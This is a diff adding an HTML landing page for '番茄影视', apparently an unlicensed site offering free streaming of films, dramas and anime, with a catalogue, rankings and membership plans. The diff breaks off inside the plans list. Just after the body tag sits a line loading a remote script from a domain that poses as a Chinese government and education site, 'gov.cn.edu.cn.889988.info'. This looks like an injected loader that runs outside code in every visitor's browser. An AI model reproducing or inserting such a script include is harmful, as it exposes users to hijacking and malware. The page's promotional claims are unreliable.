@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>番茄影视_番茄影视官网入口_高清电影电视剧综艺动漫免费在线观看平台</title>
+<meta name="keywords" content="番茄影视,番茄影视官网,番茄影视在线观看,番茄影视入口网址,番茄影视最新地址,fanjiayingshi-app,高清电影在线播放,热门电视剧免费看,综艺真人秀更新,动漫番剧连载,影视大全排行榜,手机投屏观影">
+<meta name="description" content="番茄影视（https://fanjiayingshi-app.github.io）收录电影、国产剧集、日韩剧场、欧美剧集、综艺真人秀、动漫番剧与纪录片共四万余条影片信息，每日跟进三百余部剧集更新，支持倍速播放、多线路切换、清晰度自适应与手机电视投屏。打开番茄影视即可检索想看的片子，播放进度三端同步，找片、追剧、补番一站完成。">
+<meta name="author" content="番茄影视">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#12100f">
+<link rel="canonical" href="https://fanjiayingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="番茄影视">
+<meta property="og:title" content="番茄影视｜高清影视在线观看与追剧入口">
+<meta property="og:description" content="番茄影视聚合电影、剧集、综艺、动漫与纪录片资源索引，日更三百余部，支持倍速、多线路、投屏与三端进度同步。">
+<meta property="og:url" content="https://fanjiayingshi-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="番茄影视｜高清影视在线观看与追剧入口">
+<meta name="twitter:description" content="电影、剧集、综艺、动漫、纪录片一站式检索与追更，番茄影视每日更新。">
+<style>
+:root{
+  --ink:#12100f;
+  --ink-2:#1b1817;
+  --ink-3:#252120;
+  --paper:#f6f1ea;
+  --tomato:#ff4d33;
+  --tomato-dark:#d8341f;
+  --amber:#ffb03a;
+  --leaf:#4fbf7b;
+  --grey:#9a918b;
+  --line:rgba(246,241,234,.12);
+  --radius:14px;
+  --max:1180px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--ink);
+  color:var(--paper);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,-apple-system,sans-serif;
+  font-size:16px;
+  line-height:1.75;
+  overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+h1,h2,h3,h4{line-height:1.25;font-weight:800;letter-spacing:.5px}
+.wrap{width:100%;max-width:var(--max);margin:0 auto;padding:0 20px}
+.sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
+
+/* 顶部导航 */
+.topbar{
+  position:sticky;top:0;z-index:60;
+  background:rgba(18,16,15,.88);
+  backdrop-filter:saturate(150%) blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:64px;gap:16px}
+.brand{display:flex;align-items:center;gap:10px;flex-shrink:0}
+.brand .fruit{
+  position:relative;width:26px;height:26px;border-radius:50% 50% 48% 48%;
+  background:radial-gradient(circle at 32% 28%,#ff7a63,var(--tomato) 58%,var(--tomato-dark));
+  box-shadow:0 4px 14px rgba(255,77,51,.35);
+}
+.brand .fruit::before{
+  content:"";position:absolute;top:-4px;left:50%;transform:translateX(-50%) rotate(-18deg);
+  width:14px;height:6px;border-radius:50%;background:var(--leaf);
+}
+.brand .fruit::after{
+  content:"";position:absolute;top:-6px;left:50%;transform:translateX(-50%) rotate(22deg);
+  width:10px;height:5px;border-radius:50%;background:#3aa866;
+}
+.brand strong{font-size:20px;letter-spacing:2px}
+.brand span{font-size:11px;color:var(--grey);letter-spacing:3px;text-transform:uppercase;display:block;margin-top:-4px}
+.nav{display:flex;align-items:center;gap:4px}
+.nav a{
+  font-size:14.5px;padding:8px 12px;border-radius:8px;color:#e7e0d8;
+  transition:background .22s,color .22s;
+}
+.nav a:hover,.nav a:focus{background:rgba(255,77,51,.14);color:#fff;outline:none}
+.nav .go{
+  background:linear-gradient(135deg,var(--tomato),#ff7a3d);
+  color:#fff;font-weight:700;padding:9px 18px;margin-left:6px;
+  box-shadow:0 6px 18px rgba(255,77,51,.3);
+}
+.burger{display:none;width:42px;height:42px;border:1px solid var(--line);border-radius:10px;background:none;cursor:pointer;position:relative}
+.burger i{position:absolute;left:11px;width:18px;height:2px;background:var(--paper);transition:.25s}
+.burger i:nth-child(1){top:14px}
+.burger i:nth-child(2){top:20px}
+.burger i:nth-child(3){top:26px}
+.burger.on i:nth-child(1){top:20px;transform:rotate(45deg)}
+.burger.on i:nth-child(2){opacity:0}
+.burger.on i:nth-child(3){top:20px;transform:rotate(-45deg)}
+
+/* 首屏 */
+.hero{position:relative;padding:76px 0 54px;overflow:hidden}
+.hero::before{
+  content:"";position:absolute;top:-180px;right:-140px;width:520px;height:520px;border-radius:50%;
+  background:radial-gradient(circle,rgba(255,77,51,.28),transparent 66%);
+}
+.hero::after{
+  content:"";position:absolute;left:-160px;bottom:-220px;width:460px;height:460px;border-radius:50%;
+  background:radial-gradient(circle,rgba(255,176,58,.16),transparent 68%);
+}
+.hero .wrap{position:relative;display:grid;grid-template-columns:1.35fr .95fr;gap:44px;align-items:start}
+.tagline{
+  display:inline-flex;align-items:center;gap:8px;font-size:13px;color:var(--amber);
+  border:1px solid rgba(255,176,58,.35);border-radius:999px;padding:5px 14px;margin-bottom:22px;
+  background:rgba(255,176,58,.07);
+}
+.tagline b{width:6px;height:6px;border-radius:50%;background:var(--amber)}
+h1{font-size:clamp(34px,5.4vw,60px);letter-spacing:1px}
+h1 em{font-style:normal;color:var(--tomato);position:relative}
+h1 em::after{
+  content:"";position:absolute;left:0;right:0;bottom:6px;height:10px;z-index:-1;
+  background:linear-gradient(90deg,rgba(255,77,51,.42),rgba(255,176,58,.05));
+}
+.lede{margin-top:20px;color:#cfc7be;font-size:16.5px;max-width:620px}
+.search{
+  margin-top:30px;display:flex;background:var(--ink-2);border:1px solid var(--line);
+  border-radius:999px;padding:6px;max-width:600px;
+}
+.search input{
+  flex:1;background:none;border:none;outline:none;color:var(--paper);
+  font-size:15px;padding:10px 16px;font-family:inherit;
+}
+.search input::placeholder{color:#7d766f}
+.search button{
+  border:none;border-radius:999px;padding:10px 26px;font-size:15px;font-weight:700;color:#fff;cursor:pointer;
+  background:linear-gradient(135deg,var(--tomato),#ff7a3d);font-family:inherit;
+}
+.hint{margin-top:14px;font-size:13px;color:var(--grey)}
+.hint a{color:#d8cfc5;border-bottom:1px dotted #6c6560}
+.hint a:hover{color:var(--amber)}
+.board{
+  background:linear-gradient(180deg,rgba(37,33,32,.95),rgba(27,24,23,.9));
+  border:1px solid var(--line);border-radius:var(--radius);padding:20px;
+  box-shadow:0 24px 50px rgba(0,0,0,.4);
+}
+.board h2{font-size:15px;letter-spacing:2px;color:var(--amber);display:flex;justify-content:space-between;align-items:center}
+.board h2 small{font-size:11px;color:var(--grey);letter-spacing:0}
+.board li{display:flex;gap:12px;padding:14px 0;border-bottom:1px dashed rgba(246,241,234,.1)}
+.board li:last-child{border-bottom:none;padding-bottom:0}
+.board .no{
+  flex:0 0 30px;height:30px;border-radius:8px;background:rgba(255,77,51,.16);color:var(--tomato);
+  font-size:14px;font-weight:800;display:flex;align-items:center;justify-content:center;
+}
+.board .t{font-size:14.5px;font-weight:600}
+.board .d{font-size:12.5px;color:var(--grey)}
+.board .d b{color:var(--leaf);font-weight:600}
+
+/* 滚动条 */
+.ticker{border-top:1px solid var(--line);border-bottom:1px solid var(--line);background:var(--ink-2);overflow:hidden;padding:11px 0}
+.ticker-track{display:flex;gap:44px;white-space:nowrap;animation:slide 34s linear infinite;width:max-content}
+.ticker-track span{font-size:13.5px;color:#bfb6ad}
+.ticker-track span::before{content:"●";color:var(--tomato);margin-right:9px;font-size:10px;vertical-align:middle}
+@keyframes slide{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* 数据条 */
+.stats{background:linear-gradient(100deg,var(--tomato-dark),#8f2a15);clip-path:polygon(0 0,100% 0,100% 82%,0 100%)}
+.stats .wrap{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;padding-top:34px;padding-bottom:48px}
+.stat{padding-left:16px;border-left:2px solid rgba(255,255,255,.28)}
+.stat b{display:block;font-size:clamp(24px,3.4vw,34px);font-weight:800;letter-spacing:1px}
+.stat b i{font-style:normal;font-size:14px;font-weight:600;opacity:.85;margin-left:3px}
+.stat span{font-size:13px;color:rgba(255,255,255,.82)}
+
+/* 通用区块 */
+section{padding:74px 0}
+.sechead{margin-bottom:34px}
+.sechead .kicker{font-size:12px;letter-spacing:4px;color:var(--tomato);text-transform:uppercase}
+.sechead h2{font-size:clamp(24px,3.6vw,36px);margin-top:8px}
+.sechead p{margin-top:12px;color:#b9b1a9;font-size:15px;max-width:680px}
+
+/* 分类拼接 */
+.grid-cat{
+  display:grid;grid-template-columns:repeat(4,1fr);grid-auto-rows:132px;gap:14px;
+  grid-template-areas:
+    "a a b c"
+    "d e b f"
+    "g e h h";
+}
+.cat{border-radius:var(--radius);padding:18px;position:relative;overflow:hidden;border:1px solid var(--line);display:flex;flex-direction:column;justify-content:flex-end;transition:transform .3s,border-color .3s}
+.cat:hover{transform:translateY(-4px);border-color:rgba(255,77,51,.5)}
+.cat::before{content:"";position:absolute;inset:0;opacity:.92}
+.cat.a::before{background:linear-gradient(140deg,#3a1410,#12100f)}
+.cat.b::before{background:linear-gradient(160deg,#123028,#12100f)}
+.cat.c::before{background:linear-gradient(160deg,#2c1b38,#12100f)}
+.cat.d::before{background:linear-gradient(160deg,#1b2438,#12100f)}
+.cat.e::before{background:linear-gradient(160deg,#3a2a10,#12100f)}
+.cat.f::before{background:linear-gradient(160deg,#0f2b33,#12100f)}
+.cat.g::before{background:linear-gradient(160deg,#331a22,#12100f)}
+.cat.h::before{background:linear-gradient(120deg,#3a1410,#221512)}
+.cat h3{position:relative;font-size:19px}
+.cat p{position:relative;font-size:12.5px;color:#c3bbb3;margin-top:4px}
+.cat .num{position:relative;margin-top:8px;font-size:12px;color:var(--amber);letter-spacing:1px}
+.cat .ic{position:absolute;top:16px;right:18px;width:34px;height:34px;border-radius:9px;background:rgba(246,241,234,.08);display:flex;align-items:center;justify-content:center;font-size:16px}
+.cat.a{grid-area:a}.cat.b{grid-area:b}.cat.c{grid-area:c}.cat.d{grid-area:d}
+.cat.e{grid-area:e}.cat.f{grid-area:f}.cat.g{grid-area:g}.cat.h{grid-area:h}
+
+/* 榜单横滑 */
+.rank-scroll{display:flex;gap:16px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:14px;-webkit-overflow-scrolling:touch}
+.rank-scroll::-webkit-scrollbar{height:6px}
+.rank-scroll::-webkit-scrollbar-thumb{background:#3a3432;border-radius:6px}
+.rcard{
+  flex:0 0 268px;scroll-snap-align:start;background:var(--ink-2);border:1px solid var(--line);
+  border-radius:var(--radius);padding:18px;display:flex;gap:14px;transition:border-color .25s,background .25s;
+}
+.rcard:hover{border-color:rgba(255,77,51,.55);background:var(--ink-3)}
+.rcard .idx{font-size:40px;font-weight:800;color:rgba(255,77,51,.3);line-height:1;flex:0 0 auto;width:44px;text-align:center}
+.rcard .meta h3{font-size:16px}
+.rcard .meta p{font-size:12.5px;color:var(--grey);margin-top:6px}
+.rcard .meta .score{margin-top:10px;font-size:13px;color:var(--amber)}
+.rcard .meta .score s{color:#6f6863;text-decoration:none;margin-left:6px;font-size:12px}
+.rank-note{margin-top:12px;font-size:13px;color:#8d857f}
+
+/* 交错特性 */
+.feature{background:var(--ink-2);border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.frow{display:grid;grid-template-columns:1fr 1fr;gap:46px;align-items:center;margin-bottom:52px}
+.frow:last-child{margin-bottom:0}
+.frow.rev .ftext{order:2}
+.frow .ftext h3{font-size:24px}
+.frow .ftext p{margin-top:12px;color:#bdb5ad;font-size:15px}
+.frow .ftext ul{margin-top:18px;display:grid;gap:10px}
+.frow .ftext li{display:flex;gap:10px;font-size:14.5px;color:#d5cec6}
+.frow .ftext li::before{content:"▸";color:var(--tomato);font-size:13px;margin-top:1px}
+.fart{
+  position:relative;aspect-ratio:16/10;border-radius:var(--radius);border:1px solid var(--line);
+  background:linear-gradient(145deg,#2a2422,#141211);display:flex;align-items:center;justify-content:center;overflow:hidden;
+}
+.fart .screen{
+  width:74%;height:62%;border-radius:10px;border:1px solid rgba(246,241,234,.16);
+  background:linear-gradient(180deg,#191516,#0f0d0d);position:relative;display:flex;align-items:center;justify-content:center;
+}
+.fart .screen::after{
+  content:"";width:0;height:0;border-left:20px solid var(--tomato);
+  border-top:13px solid transparent;border-bottom:13px solid transparent;margin-left:6px;
+}
+.fart .bar{position:absolute;left:12%;right:12%;bottom:14%;height:4px;border-radius:4px;background:rgba(246,241,234,.14)}
+.fart .bar i{display:block;height:100%;width:58%;border-radius:4px;background:linear-gradient(90deg,var(--tomato),var(--amber))}
+.fart .dots{position:absolute;top:14px;left:14px;display:flex;gap:6px}
+.fart .dots i{width:8px;height:8px;border-radius:50%;background:#4a423f}
+.fart .dots i:first-child{background:var(--tomato)}
+.fart.wide .screen{width:56%;height:74%;border-radius:50%;border-width:2px}
+.fart.wide .screen::after{border-left-color:var(--amber)}
+
+/* 时间轴 */
+.steps{position:relative;padding-left:30px}
+.steps::before{content:"";position:absolute;left:8px;top:8px;bottom:8px;width:2px;background:linear-gradient(180deg,var(--tomato),rgba(255,176,58,.2))}
+.step{position:relative;padding:0 0 30px}
+.step:last-child{padding-bottom:0}
+.step::before{content:"";position:absolute;left:-30px;top:8px;width:18px;height:18px;border-radius:50%;background:var(--ink);border:3px solid var(--tomato)}
+.step h3{font-size:18px}
+.step p{margin-top:6px;color:#bab2aa;font-size:14.5px;max-width:640px}
+.step .sno{font-size:12px;letter-spacing:2px;color:var(--amber);display:block;margin-bottom:4px}
+
+/* 会员 */
+.plans{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;align-items:end}
+.plan{border:1px solid var(--line);border-radius:var(--radius);padding:26px 22px;background:var(--ink-2)}
+.plan.hot{
+  border-color:rgba(255,77,51,.6);background:linear-gradient(180deg,rgba(255,77,51,.12),var(--ink-2));
+  transform:translateY(-14px);box-shadow:0 20px 44px rgba(255,77,51,.14);
+}
+.plan .pn{font-size:14px;letter-spacing:2px;color:var(--grey)}
+.plan.hot .pn{color:var(--amber)}
+.plan .pp{font-size:34px;font-weight:800;margin:10px 0 2px}
+.plan .pp small{font-size:14px;font-weight:500;color:var(--grey)}
+.plan ul{margin:18px 0 22px;display:grid;gap:9px}
+.plan li{font-size:14px;color:#cfc8c0;display:flex;gap:8px}
+.plan li::before{content:"✓";color:var(--leaf)}
+.plan .btn{
+  display:block;text-align:center;padding:11px;border-radius:10px;font-size:14.5px;font-weight:700;
+  border:1px solid var(--line);color:var(--paper);
+}
+.plan.hot .btn{background:linear-gradient(135deg,var(--tomato),#ff7a3d);border-color:transparent;color:#fff}
+
+/* FAQ */
+.faq{border-top:1px solid var(--line)}
+.faq details{border-bottom:1px solid var(--line);background:var(--ink)}
+.faq summary{
+  cursor:pointer;padding:20px 4px;font-size:16.5px;font-weight:600;list-style:none;display:flex;
+  justify-content:space-between;align-items:center;gap:14px;
+}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"+";color:var(--tomato);font-size:22px;font-weight:400;flex:0 0 auto}
+.faq details[open] summary::after{content:"–"}
+.faq details p{padding:0 4px 20px;color:#b4aca4;font-size:14.5px;max-width:820px}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.2fr .8fr;gap:40px}
+.about p{color:#bab2aa;font-size:15px;margin-bottom:14px}
+.card{border:1px solid var(--line);border-radius:var(--radius);background:var(--ink-2);padding:24px}
+.card h3{font-size:16px;margin-bottom:14px}
+.card dl{display:grid;grid-template-columns:auto 1fr;gap:10px 16px;font-size:14px}
+.card dt{color:var(--grey)}
+.card dd{color:#ddd6ce}
+.card dd a{color:var(--amber)}
+
+/* 页脚 */
+footer{background:var(--ink-2);border-top:1px solid var(--line);padding:52px 0 28px}
+.fcols{display:grid;grid-template-columns:1.4fr repeat(3,1fr);gap:30px}
+.fcols h4{font-size:15px;margin-bottom:14px}
+.fcols li{margin-bottom:9px}
+.fcols a{font-size:14px;color:#a9a29b}
+.fcols a:hover{color:var(--tomato)}
+.fabout p{font-size:13.5px;color:#948d87;margin-top:12px;max-width:340px}
+.cloud{margin-top:38px;padding-top:24px;border-top:1px solid var(--line);display:flex;flex-wrap:wrap;gap:8px}
+.cloud a{font-size:12.5px;color:#8b847e;border:1px solid var(--line);border-radius:999px;padding:5px 12px}
+.cloud a:hover{color:var(--paper);border-color:rgba(255,77,51,.5)}
+.copy{margin-top:26px;font-size:12.5px;color:#726b66;line-height:1.9}
+.copy a{color:#8d857f}
+.totop{
+  position:fixed;right:18px;bottom:20px;z-index:50;width:44px;height:44px;border-radius:50%;
+  border:1px solid var(--line);background:rgba(27,24,23,.9);color:var(--paper);font-size:18px;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;backdrop-filter:blur(6px);
+}
+.totop:hover{background:var(--tomato);border-color:transparent}
+
+@media (max-width:900px){
+  .hero .wrap{grid-template-columns:1fr;gap:32px}
+  .stats .wrap{grid-template-columns:repeat(2,1fr);gap:22px 10px}
+  .grid-cat{grid-template-columns:repeat(2,1fr);grid-auto-rows:118px;grid-template-areas:"a a" "b c" "d e" "f g" "h h"}
+  .frow{grid-template-columns:1fr;gap:24px}
+  .frow.rev .ftext{order:0}
+  .plans{grid-template-columns:1fr}
+  .plan.hot{transform:none}
+  .about,.fcols{grid-template-columns:1fr}
+  .fcols{gap:24px}
+  .nav{display:none}
+  .nav.on{
+    display:flex;flex-direction:column;align-items:stretch;position:absolute;top:64px;left:0;right:0;
+    background:var(--ink-2);border-bottom:1px solid var(--line);padding:12px 20px 18px;gap:2px;
+  }
+  .nav.on a{padding:12px 6px;border-bottom:1px solid var(--line)}
+  .nav.on .go{margin:10px 0 0;text-align:center;border-bottom:none}
+  .burger{display:block}
+  section{padding:52px 0}
+  .hero{padding:48px 0 40px}
+}
+@media (max-width:520px){
+  .brand span{display:none}
+  .rcard{flex:0 0 232px}
+  .stat{border-left-width:2px;padding-left:12px}
+  .search{flex-direction:column;border-radius:14px;padding:8px}
+  .search button{border-radius:10px}
+}
+@media (prefers-reduced-motion:reduce){
+  *{animation:none!important;scroll-behavior:auto!important;transition:none!important}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="topbar" id="top">
+  <div class="wrap">
+    <a class="brand" href="#top" aria-label="番茄影视首页">
+      <span class="fruit" aria-hidden="true"></span>
+      <span><strong>番茄影视</strong><span>FANQIAYINGSHI</span></span>
+    </a>
+    <nav class="nav" id="nav" aria-label="站内导航">
+      <a href="#catalog">片库分类</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#feature">播放体验</a>
+      <a href="#guide">观影指南</a>
+      <a href="#member">会员方案</a>
+      <a href="#faq">常见问题</a>
+      <a class="go" href="#member">立即观看</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="展开导航菜单" aria-expanded="false"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<main>
+
+<div class="hero">
+  <div class="wrap">
+    <div>
+      <p class="tagline"><b aria-hidden="true"></b>今日已更新 326 部剧集 · 4K 片源 1,820 条</p>
+      <h1>番茄影视<br>把想看的片子<em>一次看个够</em></h1>
+      <p class="lede">电影、国产剧集、日韩剧场、欧美剧集、综艺真人秀、动漫番剧、纪录片七条主线同步维护，四万余条影片信息可检索。番茄影视记录你的播放进度，手机看到一半，回家打开电视接着往下播。</p>
+      <form class="search" role="search" action="#" method="get" onsubmit="return false;">
+        <input type="search" name="q" placeholder="搜片名、演员或导演，例如：长安的荔枝" aria-label="搜索影片">
+        <button type="submit">找片</button>
+      </form>
+      <p class="hint">热门检索：<a href="#rank">热播榜</a> · <a href="#catalog">剧集分类</a> · <a href="#catalog">动漫番剧</a> · <a href="#member">投屏教程</a></p>
+    </div>
+    <aside class="board" aria-labelledby="board-t">
+      <h2 id="board-t">本周排片<small>每日 20:00 刷新</small></h2>
+      <ul>
+        <li><span class="no">1</span><span><span class="t">长安的荔枝</span><span class="d">剧集 · <b>今日更新至 18 集</b></span></span></li>
+        <li><span class="no">2</span><span><span class="t">默杀</span><span class="d">电影 · <b>4K 修复版上线</b></span></span></li>
+        <li><span class="no">3</span><span><span class="t">歌手 2026</span><span class="d">综艺 · <b>周六 20:00 直播同步</b></span></span></li>
+        <li><span class="no">4</span><span><span class="t">凡人修仙传</span><span class="d">动漫 · <b>每周五 10:00 更新</b></span></span></li>
+        <li><span class="no">5</span><span><span class="t">山河故人</span><span class="d">纪录片 · <b>全 6 集已完结</b></span></span></li>
+      </ul>
+    </aside>
+  </div>
+</div>
+
+<div class="ticker" aria-hidden="true">
+  <div class="ticker-track">
+    <span>10 月 17 日 新片上架：悬疑剧《暗河》全集</span>
+    <span>番剧《凡人修仙传》第 142 话 已更新</span>
+    <span>院线电影《默杀》4K 修复版 已接入线路二</span>
+    <span>综艺《歌手 2026》第六期 直播回放就绪</span>
+    <span>纪录片《山河故人》六集合集 一次性上线</span>
+    <span>10 月 17 日 新片上架：悬疑剧《暗河》全集</span>
+    <span>番剧《凡人修仙传》第 142 话 已更新</span>
+    <span>院线电影《默杀》4K 修复版 已接入线路二</span>
+    <span>综艺《歌手 2026》第六期 直播回放就绪</span>
+    <span>纪录片《山河故人》六集合集 一次性上线</span>
+  </div>
+</div>
+
+<div class="stats">
+  <div class="wrap">
+    <div class="stat"><b>42,860<i>部</i></b><span>片库收录总量</span></div>
+    <div class="stat"><b>326<i>部/日</i></b><span>剧集更新跟进</span></div>
+    <div class="stat"><b>4K<i>HDR</i></b><span>最高可选画质</span></div>
+    <div class="stat"><b>3<i>端同步</i></b><span>手机 平板 电视</span></div>
+  </div>
+</div>
+
+<section id="catalog">
+  <div class="wrap">
+    <div class="sechead">
+      <p class="kicker">CATALOG</p>
+      <h2>片库分类导览</h2>
+      <p>七条主线 + 短剧专场，每条线都有专人跟进更新进度，点进任意一个分类都能按地区、年份、评分二次筛选。</p>
+    </div>
+    <div class="grid-cat">
+      <a class="cat a" href="#rank">
+        <span class="ic" aria-hidden="true">▶</span>
+        <h3>热播电影</h3>
+        <p>院线新片 · 经典修复 · 类型片单</p>
+        <span class="num">收录 12,340 部</span>
+      </a>
+      <a class="cat b" href="#rank">
+        <span class="ic" aria-hidden="true">◈</span>
+        <h3>国产剧集</h3>
+        <p>都市 悬疑 古装 家庭</p>
+        <span class="num">在更 86 部</span>
+      </a>
+      <a class="cat c" href="#rank">
+        <span class="ic" aria-hidden="true">◇</span>
+        <h3>日韩剧场</h3>
+        <p>韩剧周更 · 日剧季番</p>
+        <span class="num">收录 4,120 部</span>
+      </a>
+      <a class="cat d" href="#rank">
+        <span class="ic" aria-hidden="true">▣</span>
+        <h3>欧美剧集</h3>
+        <p>英美剧 · 西班牙与北欧剧</p>
+        <span class="num">收录 5,760 部</span>
+      </a>
+      <a class="cat e" href="#rank">
+        <span class="ic" aria-hidden="true">☺</span>
+        <h3>综艺真人秀</h3>
+        <p>音乐 竞技 生活 脱口秀</p>
+        <span class="num">在更 54 档</span>
+      </a>
+      <a class="cat f" href="#rank">
+        <span class="ic" aria-hidden="true">❖</span>
+        <h3>动漫番剧</h3>
+        <p>新番 · 国漫 · 剧场版</p>
+        <span class="num">收录 8,930 部</span>
+      </a>
+      <a class="cat g" href="#rank">
+        <span class="ic" aria-hidden="true">▲</span>
+        <h3>纪录纪实</h3>
+        <p>人文 自然 历史 美食</p>
+        <span class="num">收录 2,410 部</span>
+      </a>
+      <a class="cat h" href="#member">
+        <span class="ic" aria-hidden="true">▤</span>
+        <h3>短剧专场与投屏专区</h3>
+        <p>竖屏短剧一次看完 · 支持 DLNA 投屏到电视</p>
+        <span class="num">合集 380 组 · 投屏教程见会员页</span>
+      </a>
+    </div>
+  </div>
+</section>
+
+<section id="rank">
+  <div class="wrap">
+    <div class="sechead">
+      <p class="kicker">WEEKLY RANKING</p>
+      <h2>番茄影视热播榜</h2>
+      <p>榜单按近七日站内检索与播放热度排序，每周一上午重排一次，左右滑动查看全部条目。</p>
+    </div>
+    <div class="rank-scroll" tabindex="0" aria-label="热播榜单，可横向滑动">
+      <article class="rcard"><span class="idx">01</span><div class="meta"><h3>长安的荔枝</h3><p>剧情 / 古装 · 更新至 18 集</p><span class="score">热度 98.6<s>评分 8.7</s></span></div></article>
+      <article class="rcard"><span class="idx">02</span><div class="meta"><h3>默杀</h3><p>悬疑 / 犯罪 · 4K 修复版</p><span class="score">热度 96.2<s>评分 8.4</s></span></div></article>
+      <article class="rcard"><span class="idx">03</span><div class="meta"><h3>凡人修仙传</h3><p>国漫 / 修仙 · 第 142 话</p><span class="score">热度 94.8<s>评分 9.1</s></span></div></article>
+      <article class="rcard"><span class="idx">04</span><div class="meta"><h3>歌手 2026</h3><p>音乐 / 竞技 · 第六期</p><span class="score">热度 93.5<s>评分 7.9</s></span></div></article>
+      <article class="rcard"><span class="idx">05</span><div class="meta"><h3>暗河</h3><p>悬疑 / 剧情 · 全集上线</p><span class="score">热度 91.0<s>评分 8.2</s></span></div></article>
+      <article class="rcard"><span class="idx">06</span><div class="meta"><h3>山河故人</h3><p>纪录 / 人文 · 全 6 集</p><span class="score">热度 88.4<s>评分 9.0</s></span></div></article>
+      <article class="rcard"><span class="idx">07</span><div class="meta"><h3>春日迟迟</h3><p>都市 / 情感 · 更新至 12 集</p><span class="score">热度 86.7<s>评分 7.6</s></span></div></article>
+      <article class="rcard"><span class="idx">08</span><div class="meta"><h3>深海回响</h3><p>科幻 / 冒险 · 4K HDR</p><span class="score">热度 84.3<s>评分 8.5</s></span></div></article>
+    </div>
+    <p class="rank-note">榜单仅为站内热度参考，完整排名请访问番茄影视榜单页。</p>
+  </div>
+</section>
+
+<section id="feature" class="feature">
+  <div class="wrap">
+    <div class="sechead">
+      <p class="kicker">PLAYBACK</p>
+      <h2>为长时间追剧做的播放体验</h2>
+      <p>播放器是番茄影视自己维护的，线路、清晰度、字幕、进度四件事都能在播放页一键处理。</p>
+    </div>
+
+    <div class="frow">
+      <div class="ftext">
+        <h3>多线路切换，卡了就换一条</h3>
+        <p>每条影片默认接入三条播放线路，遇到缓冲自动降级到可用线路，也可在播放页手动切换并记住你的选择。</p>
+        <ul><li>智能预加载下一段，切换清晰度不中断</li><li>0.5× 至 3.0× 倍速，支持跳过片头片尾</li><li>外挂字幕拖拽上传，自动匹配时间轴</li></ul>
+      </div>
+      <div class="fart" role="img" aria-label="播放器界面示意图">
+        <span class="dots" aria-hidden="true"><i></i><i></i><i></i></span>
+        <span class="screen" aria-hidden="true"></span>
+        <span class="bar" aria-hidden="true"><i></i></span>
+      </div>
+    </div>
+
+    <div class="frow rev">
+      <div class="ftext">
+        <h3>手机起手，电视收尾</h3>
+        <p>同一账号下的播放进度、收藏夹与追更列表实时同步，通勤路上用手机看到第 4 集 12 分，回家投屏到电视从同一秒继续。</p>
+        <ul><li>DLNA / AirPlay 一键投屏，支持电视遥控器快进</li><li>离线缓存后无网络也能播放，缓存有效期 30 天</li><li>追更更新时站内提醒，不漏掉任何一集</li></ul>
+      </div>
+      <div class="fart wide" role="img" aria-label="投屏连接示意图">
+        <span class="dots" aria-hidden="true"><i></i><i></i><i></i></span>
+        <span class="screen" aria-hidden="true"></span>
+        <span class="bar" aria-hidden="true"><i></i></span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="guide">
+  <div class="wrap">
+    <div class="sechead">
+      <p class="kicker">HOW TO WATCH</p>
+      <h2>四步看完一部剧</h2>
+      <p>新用户按这个流程走一遍，基本不会遇到找不到片源或者画质不对的问题。</p>
+    </div>
+    <div class="steps">
+      <div class="step"><span class="sno">STEP 01</span><h3>检索片名</h3><p>首页搜索框输入片名、演员或导演，也可以用分类筛选按地区和年份缩小范围，找不到片子在常见问题里有提交补录的入口。</p></div>
+      <div class="step"><span class="sno">STEP 02</span><h3>选择线路与清晰度</h3><p>进入播放页后右上角可切换线路，清晰度默认按网速自适应，家里宽带稳定时手动切到 1080P 或 4K 效果更好。</p></div>
+      <div class="step"><span class="sno">STEP 03</span><h3>投屏或缓存</h3><p>想用大屏看就点投屏图标选择电视设备；外出路上看则提前缓存，缓存完成后在无网络环境下同样可以播放。</p></div>
+      <div class="step"><span class="sno">STEP 04</span><h3>续播与追更</h3><p>退出时进度自动保存，下次从同一时间点继续。把剧集加入追更列表后，更新当天会收到提醒，全集完结也会有提示。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="member">
+  <div class="wrap">
+    <div class="sechead">
+      <p class="kicker">PLANS</p>
+      <h2>会员方案</h2>
+      <p>不注册也能看大部分内容，会员主要解决画质、投屏时长和离线缓存额度三件事。</p>
+    </div>
+    <div class="plans">
+      <div class="plan">
+        <p class="pn">免费体验</p>
+        <p class="pp">¥0<small> / 永久</small></p>
+        <ul>
+          <li>1080P 画质，标准线路</li>
+          <li>每日 2 小时投屏额度</li>
+          <li>离线缓存 3 部</li>
+          <li>基础检索与追更</li>
+        </ul>
+        <a class="btn" href="#">直接使用</a>
+      </div>
+      <div class="plan hot">
+        <p class="pn">月度会员 · 最多人选择</p>
+        <p class="pp">¥25<small> / 月</small></p>
+        <ul>
+          <li>4K HDR 画质，三条线路任选</li>
+          <li>投屏不限时长</li>
